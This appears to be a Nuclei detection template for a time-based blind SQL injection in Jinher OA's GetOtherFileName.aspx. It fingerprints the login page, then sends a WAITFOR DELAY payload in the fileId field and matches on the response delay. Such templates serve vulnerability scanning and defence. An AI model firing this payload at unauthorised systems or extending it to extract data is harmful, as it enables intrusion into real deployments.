id: poc-yaml-jinher-getotherfilename-aspx-sqli
info:
  name: 金和OA GetOtherFileName.aspx SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(2, 5)}}"
  t2: "{{to_number(t1) + 2}}"

flow: http(1) && http(2)

http:
  - id: check-page
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(body, 'JHSoft')"

  - id: sqli-check
    method: POST
    path:
      - "{{BaseURL}}/c6/JHBase.Web.Menu/GetOtherFileName.aspx/"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "fileId=1)WAITFOR DELAY'0:0:{{t1}}'--"
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "body == ''"
          - "duration > {{t1}} && duration < {{t2}}"
